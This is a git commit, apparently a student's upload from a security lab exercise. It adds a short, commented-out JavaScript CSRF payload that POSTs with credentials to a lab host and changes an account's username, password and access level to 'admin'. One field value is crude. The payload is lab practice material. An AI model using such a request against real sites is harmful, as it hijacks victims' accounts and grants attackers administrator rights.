94841ba34b80e25e9ccd1b602a285658fbed1005
Fathy Moamen <81427699@sci.s-mu.edu.eg>
2024-09-20 09:22:46 +0300

    upload all file for my project

---
+++ csrf_script.js
@@ -0,0 +1,11 @@
+// var url = 'https://w47mc7gfspkrb58tcbk364k2p.us-east-10.attackdefensecloudlabs.com/index.php?action=modifynewsposter3'
+// var paramts = 'id=3&newusername=attacker&username=fuck_you&password=abc&password2=abc&email=attackergmail%40gmail.com&language=en_GB&access=admin';
+
+// var CSRF = new XMLHttpRequest();
+
+// CSRF.open('POST', url, true);
+// CSRF.withCredentials = true;
+// CSRF.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+// CSRF.send(paramts);
+
+//document.forms[0].submit();
